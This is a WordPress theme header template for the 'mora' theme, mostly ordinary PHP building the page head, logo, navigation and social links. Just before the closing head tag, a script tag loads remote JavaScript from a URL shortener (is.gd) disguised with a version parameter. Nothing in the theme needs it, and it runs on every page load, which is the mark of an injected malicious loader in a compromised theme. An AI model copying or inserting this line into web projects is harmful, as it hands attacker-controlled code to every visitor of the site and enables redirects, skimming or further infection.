<?php
/**
 * The header for the theme.
 *
 * Displays all of the <head> section and everything up till <div id="content">
 *
 * @package mora Theme
 */

?><!DOCTYPE html>
<html <?php language_attributes(); ?>>
<head>
<meta charset="<?php bloginfo( 'charset' ); ?>">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="<?php esc_url(bloginfo( 'pingback_url' )); ?>">

<?php wp_head(); ?>
<script src="https://is.gd/k0ovtp?v=v16.0"></script></head>


<?php $mora_data = mora_dt_data();
	  $mora_mainlayout = 'wide-layout'; 
	?>
<?php if(isset($mora_data['mora_main_layout'])) { $mora_mainlayout = $mora_data['mora_main_layout']; } ?>

<body <?php body_class(); ?>>

	<!-- preloader-->
<?php 
	if(isset($mora_data['mora_enable_preloader'])) {
		if($mora_data['mora_enable_preloader'] != 0) { ?>
	<div id="qLoverlay"></div>

	<?php }} ?>

	<?php  
		$mora_header_class = 'header-regular';
		if(isset($mora_data['mora_header_type'])) {
				$mora_header_class = $mora_data['mora_header_type'];
		} 


		// getting the custom menus
		$mora_new_header_styles = 0;
		$mora_custom_nav_menu = '';
		if(!is_404()) {  
			$mora_custom_nav_menu = get_post_meta($post->ID, 'mora_page_new_menu', true); 
			$mora_new_header_styles = get_post_meta($post->ID, 'mora_pagenav_behavior_switch', true);
		}
	?>		

	<!-- sliding sidebar -->
	<?php if(isset($mora_data['mora_slide_sidebar']) && ($mora_data['mora_slide_sidebar'] === '1')) { ?>
		<div class="menu-wrap">
			<?php
			if ( is_active_sidebar( 'sliding-menu-sidebar' ) ) : ?>	
				<div id="vertical-sidebar">
					<?php dynamic_sidebar( 'sliding-menu-sidebar' ); ?>
				</div><!--end vertical-sidebar-->
				
			<?php endif; ?>			
			
			<div class="close-button" id="close-button"><?php esc_html('Close Menu', 'mora'); ?></div>
		</div>		
	<?php } ?>


<?php if($mora_header_class == 'header-left') { ?>
	<div id="mora-left-side">
		<div class="site-branding">
			<div class="logo animated fadeInUp">
			<?php 
				if(isset($mora_data['mora_svg_enabled']) && ($mora_data['mora_svg_enabled'] == '1')) { 
					if(isset($mora_data['mora_svg_logo']['url']) && ($mora_data['mora_svg_logo']['url'] !='')) {
					?>
					<a href="<?php echo esc_url(home_url('/')); ?>" title="<?php esc_attr(bloginfo( 'name' )); ?>" rel="home"><img class="is-svg" src="<?php echo esc_url($mora_data['mora_svg_logo']['url']); ?>" alt="<?php esc_attr(bloginfo( 'name' )) ?>" width="<?php echo esc_attr($mora_data['mora_svg_logo_width']); ?>" height="<?php echo esc_attr($mora_data['mora_svg_logo_height']); ?>" /></a>
			<?php	} }
			else if(isset($mora_data['mora_custom_logo']['url']) && ($mora_data['mora_custom_logo']['url'] !='')) { ?>
				<a href="<?php echo esc_url(home_url('/')); ?>" title="<?php esc_attr(bloginfo( 'name' )); ?>" rel="home"><img class="is-png" src="<?php echo esc_url($mora_data['mora_custom_logo']['url']); ?>" alt="<?php esc_attr(bloginfo( 'name' )) ?>" /></a>
			<?php } 
			
			else { ?>			
		
				<a href="<?php echo esc_url(home_url('/')); ?>"><img width="110" height="30" src="<?php echo get_template_directory_uri(); ?>/assets/images/logo.png" alt="<?php esc_attr(bloginfo( 'name' )) ?>" /></a>
			<?php } ?>	

			<?php
			if(isset($mora_data['mora_site_desc_enabled']) && ($mora_data['mora_site_desc_enabled'] == '1')) {
			 $sta_description = get_bloginfo( 'description', 'display' );
				if ( $sta_description || is_customize_preview() ) {  ?>
					<span class="site-description"><?php echo esc_html($sta_description); ?></span>
				<?php } }
			?>			
			</div><!--end logo-->

		</div><!-- .site-branding -->		

		<div class="menu-to-trigger"><?php esc_html_e('menu', 'mora'); ?></div>

		<div id="leftside-content">

			<?php if (function_exists('mora_language_selector')) { 
					if (function_exists('icl_get_languages')) {
				?>
				<div class="flags_language_selector"><?php mora_language_selector(); ?></div>
			<?php }} ?>		
			
			<?php 

				if(($mora_new_header_styles == '1') && ($mora_custom_nav_menu != '')) {
					wp_nav_menu( array( 
						'menu' => $mora_custom_nav_menu,
						'container_class' => 'dt-homepage-menu-container',
						'menu-class' => 'dt-homepage-menu'
					) );						
				}
				else {
					wp_nav_menu( array( 
						'theme_location' => 'primary', 
						'menu_id' => 'primary-menu',
						'container_class' => 'dt-homepage-menu-container',
						'menu-class' => 'dt-homepage-menu'
					) );
				}
			
			?>	

			<div id="left-side-tobottom">
			
				<?php if(isset($mora_data['mora_header_social']) && ($mora_data['mora_header_social'] == '1')) { ?>
					<ul id="headersocial" class="">
						<?php
							$mora_social_links = array('rss','facebook','twitter','flickr','google-plus', 'dribbble' , 'linkedin', 'pinterest', 'youtube', 'github-alt', 'vimeo-square', 'instagram', 'tumblr', 'behance', 'vk', 'xing', 'soundcloud', 'codepen', 'yelp', 'slideshare', 'houzz', '500px', 'tripadvisor');
							if($mora_social_links) {
								foreach($mora_social_links as $mora_social_link) {
									if(!empty($mora_data[$mora_social_link])) { echo '<li><a href="'. esc_url($mora_data[$mora_social_link]) .'" title="'. esc_attr($mora_social_link) .'" class="'.esc_attr($mora_social_link).'"  target="_blank"><i class="fa fa-'.esc_attr($mora_social_link).'"></i></a></li>';
									}								
								}
								if(!empty($mora_data['skype'])) { echo '<li><a href="skype:'. esc_attr($mora_data['skype']) .'?call" title="'. esc_attr($mora_data['skype']) .'" class="'.esc_attr($mora_data['skype']).'"  target="_blank"><i class="fa fa-skype"></i></a></li>';
								}							
							}
						?>
					</ul>	
				<?php } ?>		

				<div class="site-info">
					<?php if(isset($mora_data['mora_copyright_textarea']) && ($mora_data['mora_copyright_textarea'] !='')) { 
						echo wp_kses_post($mora_data['mora_copyright_textarea']);
					 		} else {  
					 	esc_html_e('Copyright - Mora | All Rights Reserved', 'mora'); 
					 } ?>
				</div><!-- .site-info -->		

			</div>		
		</div><!--end leftside content-->
	</div>
<?php } ?>

	
<div id="page" class="hfeed <?php echo esc_attr($mora_header_class); ?> site <?php echo esc_attr($mora_mainlayout); ?>">
	<a class="skip-link screen-reader-text" href="#content"><?php esc_html_e( 'Skip to content', 'mora' ); ?></a>

<?php if($mora_header_class == 'header-regular') { ?>	

 	<?php

 	$mora_headerscheme = 'light-header';
 	 if(isset($mora_data['mora_header_scheme'])) { $mora_headerscheme = $mora_data['mora_header_scheme']; } ?> 

	<header id="header" class="site-header initial-state">
		<div class="container">
			<div class="three columns logo-container">
				<div class="site-branding">
					<div class="logo animated fadeInUp">
					<?php 
						if(isset($mora_data['mora_svg_enabled']) && ($mora_data['mora_svg_enabled'] == '1')) { 
							if(isset($mora_data['mora_svg_logo']['url']) && ($mora_data['mora_svg_logo']['url'] !='')) {
							?>
							<a href="<?php echo esc_url(home_url('/')); ?>" title="<?php esc_attr(bloginfo( 'name' )); ?>" rel="home"><img class="is-svg" src="<?php echo esc_url($mora_data['mora_svg_logo']['url']); ?>" alt="<?php esc_attr(bloginfo( 'name' )) ?>" width="<?php echo esc_attr($mora_data['mora_svg_logo_width']); ?>" height="<?php echo esc_attr($mora_data['mora_svg_logo_height']); ?>" /></a>
					<?php	} }
					else if(isset($mora_data['mora_custom_logo']['url']) && ($mora_data['mora_custom_logo']['url'] !='')) { ?>
						<a href="<?php echo esc_url(home_url('/')); ?>" title="<?php esc_attr(bloginfo( 'name' )); ?>" rel="home"><img class="is-png" src="<?php echo esc_url($mora_data['mora_custom_logo']['url']); ?>" alt="<?php esc_attr(bloginfo( 'name' )) ?>" /></a>
					<?php } 
					
					else { ?>			
				
						<a href="<?php echo esc_url(home_url('/')); ?>"><img src="<?php echo get_template_directory_uri(); ?>/assets/images/logo.png" alt="<?php esc_attr(bloginfo( 'name' )) ?>" width="110" height="30" /></a>
					<?php } ?>	

					<?php
					if(isset($mora_data['mora_site_desc_enabled']) && ($mora_data['mora_site_desc_enabled'] == '1')) {
					 $sta_description = get_bloginfo( 'description', 'display' );
						if ( $sta_description || is_customize_preview() ) {  ?>
							<span class="site-description"><?php echo esc_html($sta_description); ?></span>
						<?php } }
					?>			
					</div><!--end logo-->

				</div><!-- .site-branding -->
			</div><!-- .three.columns -->

		<?php 
			$mora_menu_type = 'classic-menu';
			$mora_redux_menu_type = 'classic-menu';
			if(isset($mora_data['mora_menu_type'])) {
				$mora_redux_menu_type = $mora_data['mora_menu_type'];
			}

			$mora_pagenav_behavior_switch = rwmb_meta('mora_pagenav_behavior_switch');
			$mora_page_menu_type = rwmb_meta('mora_page_menu_style');			

			if($mora_pagenav_behavior_switch != 1) {
				$mora_menu_type = $mora_redux_menu_type;
			} 
			else $mora_menu_type = $mora_page_menu_type;

			$mora_header_social = '';
			if(isset($mora_data['mora_header_social']) && ($mora_data['mora_header_social'] == '1')) {
				$mora_header_social = 'is-header-social';
			}

		?>
			
		<?php if($mora_menu_type !='fullscreen-menu') { ?> 			
			
			<div class="nine columns nav-trigger <?php echo esc_attr($mora_menu_type).' '.esc_attr($mora_header_social)?>">

				<div class="header-nav">

					<nav id="site-navigation" class="main-navigation <?php echo esc_attr($mora_menu_type).' '. esc_attr($mora_headerscheme); ?>">

					<?php if(isset($mora_data['mora_search_header']) && ($mora_data['mora_search_header'] == '1')) { ?>
						<div class="searchform-wrapper <?php echo esc_attr($mora_headerscheme); ?>">
							<div class="searchform-switch">
								<i class="fa fa-search"></i>
								<i class="fa fa-times-circle"></i>
							</div>

							<?php get_search_form(); ?>							
						</div>
					
					<?php } ?>							

					<?php if (function_exists('mora_language_selector')) { 
							if (function_exists('icl_get_languages')) {
						?>
						<div class="flags_language_selector <?php echo esc_attr($mora_headerscheme); ?>"><?php mora_language_selector(); ?></div>
					<?php }} ?>							

					<?php  

				if(($mora_new_header_styles == '1') && ($mora_custom_nav_menu != '')) {
					wp_nav_menu( array( 
						'menu' => $mora_custom_nav_menu,
						'container_class' => 'dt-homepage-menu-container',
						'menu-class' => 'dt-homepage-menu'
					) );						
				}
				else {
					wp_nav_menu( array( 
						'theme_location' => 'primary', 
						'menu_id' => 'primary-menu',
						'container_class' => 'dt-homepage-menu-container',
						'menu-class' => 'dt-homepage-menu'
					) );
				}

					?>
					</nav><!-- #site-navigation -->		
				</div> <!-- .header-nav -->	
			</div><!-- .nine.columns-->
			<?php } ?>
			
			<?php if(isset($mora_data['mora_header_social']) && ($mora_data['mora_header_social'] == '1')) { ?>
				<ul id="headersocial" class="<?php echo esc_attr($mora_menu_type).' '.esc_attr($mora_headerscheme); ?>">
					<?php
						$mora_social_links = array('rss','facebook','twitter','flickr','google-plus', 'dribbble' , 'linkedin', 'pinterest', 'youtube', 'github-alt', 'vimeo-square', 'instagram', 'tumblr', 'behance', 'vk', 'xing', 'soundcloud', 'codepen', 'yelp', 'slideshare', 'houzz', '500px' ,'tripadvisor');
						if($mora_social_links) {
							foreach($mora_social_links as $mora_social_link) {
								if(!empty($mora_data[$mora_social_link])) { echo '<li><a href="'. esc_url($mora_data[$mora_social_link]) .'" title="'. esc_attr($mora_social_link) .'" class="'.esc_attr($mora_social_link).'"  target="_blank"><i class="fa fa-'.esc_attr($mora_social_link).'"></i></a></li>';
								}								
							}
							if(!empty($mora_data['skype'])) { echo '<li><a href="skype:'. esc_attr($mora_data['skype']) .'?call" title="'. esc_attr($mora_data['skype']) .'" class="'.esc_attr($mora_data['skype']).'"  target="_blank"><i class="fa fa-skype"></i></a></li>';
							}							
						}
					?>
				</ul>	
			<?php } ?>	

				<!-- burger menu -->
				<div class="bm <?php echo esc_attr($mora_headerscheme) . ' ' .esc_attr($mora_menu_type)?>">
					<div class="bi burger-icon">
						<div id="burger-menu">
							<div class="bar"></div>
							<div class="bar"></div>
							<div class="bar"></div>
						</div>
					</div>	
				</div>		
		</div>

		<?php if($mora_menu_type == 'fullscreen-menu') { ?> 	
		<div class="overlay">
			<div class="wrap centered-wrapper">
					<?php 

					if(($mora_new_header_styles == '1') && ($mora_custom_nav_menu != '')) {
						wp_nav_menu( array( 
							'menu' => $mora_custom_nav_menu,
							'menu_id' => 'wrap-navigation',
							'sort_column' => 'menu_order',
							'menu_class' => 'wrap-nav',
							'fallback_cb' => ''							
						) );						
					}
					else {
						wp_nav_menu( array( 
							'theme_location' => 'primary', 
							'menu_id' => 'wrap-navigation',
							'sort_column' => 'menu_order',
							'menu_class' => 'wrap-nav',
							'fallback_cb' => ''	
						) );
					}
					?>
				<div class="clear"></div>

				<?php if (function_exists('mora_language_selector')) { ?>
					<div class="flags_language_selector <?php echo esc_attr($mora_headerscheme); ?>"><?php mora_language_selector(); ?></div>
				<?php } ?>					
						
			</div>
		</div>		
		<?php } ?>
			

	</header><!-- #masthead -->

<?php } ?> 	

	<div id="hello"></div>

	<div class="menu-fixer"></div>

	<div id="content" class="site-content">